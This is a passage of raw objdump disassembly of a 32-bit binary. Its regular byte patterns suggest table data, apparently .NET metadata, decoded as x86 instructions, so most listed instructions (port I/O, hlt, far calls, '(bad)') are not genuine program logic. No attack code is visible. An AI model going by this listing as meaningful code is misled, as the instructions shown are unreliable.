  406343:	00 96 00 e0 00 0a    	add    %dl,0xa00e000(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 0e 04 84    	add    %dl,-0x7bfbf200(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 3e 04 89    	add    %dl,-0x76fbc200(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 02 02 0a    	add    %dl,0xa020200(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 74 06 94          	add    %dh,-0x6c(%esi,%eax,1)
  406381:	00 10                	add    %dl,(%eax)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 58 15             	add    %bl,0x15(%eax)
  40638e:	58                   	pop    %eax
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 9d 14 9a    	add    %dl,-0x65eb6300(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 cf 02 9a    	add    %dl,-0x65fd3100(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 f2 1d 0a    	add    %dl,0xa1df218(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 fb                	add    %bh,%bl
  4063c5:	0a 0a                	or     (%edx),%cl
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	ec                   	in     (%dx),%al
  4063d3:	1d 0e 00 14 00       	sbb    $0x14000e,%eax
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 f0 23 0a    	add    %dl,0xa23f000(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 7e 24 1d    	add    %dl,0x1d247e00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 30 05 1d    	add    %dl,0x1d053000(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 d1 18 1d    	add    %dl,0x1d18d100(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 a2 05 1d 00 14    	add    %ah,0x14001d05(%edx)
  40641d:	00 20                	add    %ah,(%eax)
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 c1                	add    %al,%cl
  406427:	1f                   	pop    %ds
  406428:	1d 00 14 00 78       	sbb    $0x78001400,%eax
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 ec 1d 0e    	add    %al,0xe1dec18(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 77 08             	add    %dh,0x8(%edi)
  406444:	c3                   	ret
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 91 08 c7 00 14    	add    %dl,0x1400c708(%ecx)
  406455:	00 5c 37 00          	add    %bl,0x0(%edi,%esi,1)
  406459:	00 00                	add    %al,(%eax)
  40645b:	00 96 00 e4 15 53    	add    %dl,0x5315e400(%esi)
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 b9 14 1d    	add    %dl,0x1d14b900(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 25 08 0a    	add    %dl,0xa082500(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 33 1a c3    	add    %dl,-0x3ce5cd00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 76 0a d5    	add    %dl,-0x2af58a00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 af 1a 0a    	add    %dl,0xa1aaf00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 eb 05 c3    	add    %dl,-0x3cfa1500(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 2b 07 1d    	add    %dl,0x1d072b00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 58 1b 0a    	add    %dl,0xa1b5800(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 19    	add    %al,0x19209600(%eax)
  4064dd:	05 e0 00 16 00       	add    $0x1600e0,%eax
  4064e2:	00 00                	add    %al,(%eax)
  4064e4:	00 00                	add    %al,(%eax)
  4064e6:	80 00 96             	addb   $0x96,(%eax)
  4064e9:	20 62 04             	and    %ah,0x4(%edx)
  4064ec:	e4 00                	in     $0x0,%al
  4064ee:	16                   	push   %ss
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 80    	add    %al,-0x7fdf6a00(%eax)
  4064f9:	07                   	pop    %es
  4064fa:	ec                   	in     (%dx),%al
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 ea    	add    %al,-0x15df6a00(%eax)
  406507:	12 f1                	adc    %cl,%dh
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 40    	add    %al,0x40209600(%eax)
  406515:	13 f8                	adc    %eax,%edi
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 e7                	and    %ah,%bh
  406523:	1b ff                	sbb    %edi,%edi
  406525:	00 1d 00 ad 21 00    	add    %bl,0x21ad00
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 ec 18 1c    	add    %dl,0x1c18ec00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 a6 23 0a    	add    %dl,0xa23a600(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 00                	add    %al,(%eax)
  40654d:	24 0a                	and    $0xa,%al
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 b6 00 23    	add    %dl,0x2300b600(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 14 25 2a 01 24 00 	add    %dl,0x24012a(,%eiz,1)
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 55 25 84    	add    %dl,-0x7bdaab00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 d5 09 1d    	add    %dl,0x1d09d500(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 f2 1d 0a    	add    %dl,0xa1df218(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 04 1b 9a    	add    %dl,-0x65e4fc00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 ae 17 38 01 27    	add    %ch,0x27013817(%esi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 c6 06 0a    	add    %dl,0xa06c600(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 5b 05 3e    	add    %dl,0x3e055b00(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 f2                	sbb    %dh,%dl
  4065d9:	1d 0a 00 29 00       	sbb    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	ec                   	in     (%dx),%al
  4065e7:	1d 6b 01 29 00       	sbb    $0x29016b,%eax
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 a8 00 70    	add    %al,0x7000a800(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 83 09 75    	add    %al,0x75098300(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	f0 15 70 01 2c 00    	lock adc $0x2c0170,%eax
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 58 17 75    	add    %al,0x75175800(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 33 08 7c 01    	addl   $0x17c0833,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 f2 1d 0a    	add    %dl,0xa1df218(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 64 15 c7          	add    %ah,-0x39(%ebp,%edx,1)
  40664b:	00 30                	add    %dh,(%eax)
  40664d:	00 40 45             	add    %al,0x45(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 91 14 84 01 31    	add    %dl,0x31018414(%ecx)
  40665b:	00 9f 22 00 00 00    	add    %bl,0x22(%edi)
  406661:	00 96 00 74 09 2a    	add    %dl,0x2a097400(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 60 0a             	add    %ah,0xa(%eax)
  406674:	93                   	xchg   %eax,%ebx
  406675:	01 33                	add    %esi,(%ebx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 af 16 93    	add    %dl,-0x6ce95100(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b6 08 93 01 35    	add    %dh,0x35019308(%esi)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 62 24             	add    %ah,0x24(%edx)
  40669e:	84 01                	test   %al,(%ecx)
  4066a0:	36 00 b9 22 00 00 00 	add    %bh,%ss:0x22(%ecx)
  4066a7:	00 96 00 6b 0a 99    	add    %dl,-0x66f59500(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 07 0b 9f    	add    %dl,-0x60f4f900(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 e8 1a a5    	add    %dl,-0x5ae51800(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 17 0b ab    	add    %dl,-0x54f4e900(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	ec                   	in     (%dx),%al
  4066e3:	1d 0e 00 3b 00       	sbb    $0x3b000e,%eax
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 f2                	sbb    %dh,%dl
  4066f1:	1d 0a 00 3b 00       	sbb    $0x3b000a,%eax
  4066f6:	17                   	pop    %ss
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 ec 1d b1    	add    %al,-0x4ee213e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 63 22             	or     %esp,0x22(%ebx)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 2e                	add    %ebp,(%esi)
  40671b:	23 bf 01 3c 00 63    	and    0x63003c01(%edi),%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 7e 21             	add    %edi,0x21(%esi)
  40672a:	0e                   	push   %cs
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 ec 1d cb    	add    %al,-0x34e213e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 ed 07 d7    	add    %al,-0x28f81300(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 d1 1f dc    	add    %al,-0x23e02f00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 ce 1b e2    	add    %al,-0x1de43200(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 d2 08 e8    	add    %al,-0x17f72e00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 3b 18 ee    	add    %al,-0x11e7c4f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	4d                   	dec    %ebp
  40678b:	15 f4 01 42 00       	adc    $0x4201f4,%eax
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 f4 20 6b 01    	addl   $0x16b20f4,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 01 03 0e 00    	addl   $0xe0301,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 1d 07 d7 01    	addl   $0x1d7071d,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 f3 1a 0a 02    	addl   $0x20a1af3,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	30 01                	xor    %al,(%ecx)
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 3b 06 d7    	add    %al,-0x28f9c500(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 bd 16 d7    	add    %al,-0x28e94300(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 e1 26 d7    	add    %al,-0x28d91f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 ed 03 0f 02    	addl   $0x20f03ed,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 ae 01 0f 02    	addl   $0x20f01ae,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	65 07                	gs pop %es
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 41 03 1a    	add    %al,0x1a034100(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 31 13 1f    	add    %al,0x1f133100(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	b9 04 23 02 49       	mov    $0x49022304,%ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	b5 03                	mov    $0x3,%ch
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	e1 0c                	loope  0x406878
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	c5 08                	lds    (%eax),%ecx
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 cb 01 36    	add    %al,0x3601cb00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 76 03             	add    %dh,0x3(%esi)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 c5 00 42    	add    %al,0x4200c500(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 13 0d 42    	add    %al,0x420d1300(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	8b 23                	mov    (%ebx),%esp
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 f5 01 0e    	add    %al,0xe01f500(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a0 01 6b    	add    %al,0x6b01a000(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 6f 1e 47    	add    %al,0x471e6f00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 21 06 4b    	add    %al,0x4b062100(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	dc 14 50             	fcoml  (%eax,%edx,2)
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	2e 04 55             	cs add $0x55,%al
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	6f                   	outsl  %ds:(%esi),(%dx)
  406921:	24 2b                	and    $0x2b,%al
  406923:	02 55 00             	add    0x0(%ebp),%dl
  406926:	24 4d                	and    $0x4d,%al
  406928:	00 00                	add    %al,(%eax)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	0e                   	push   %cs
  40692f:	16                   	push   %ss
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	ef                   	out    %eax,(%dx)
  40693d:	0c 0f                	or     $0xf,%al
  40693f:	02 57 00             	add    0x0(%edi),%dl
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	41                   	inc    %ecx
  40694b:	1e                   	push   %ds
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	d1 24 0f             	shll   $1,(%edi,%ecx,1)
  40695b:	02 58 00             	add    0x0(%eax),%bl
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	22 14 47             	and    (%edi,%eax,2),%dl
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	2f                   	das
  406975:	14 6b                	adc    $0x6b,%al
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	e1 1c                	loope  0x4069a0
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	ef                   	out    %eax,(%dx)
  406991:	1c 15                	sbb    $0x15,%al
  406993:	02 5a 00             	add    0x0(%edx),%bl
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	24 21                	and    $0x21,%al
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	30 21                	xor    %ah,(%ecx)
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
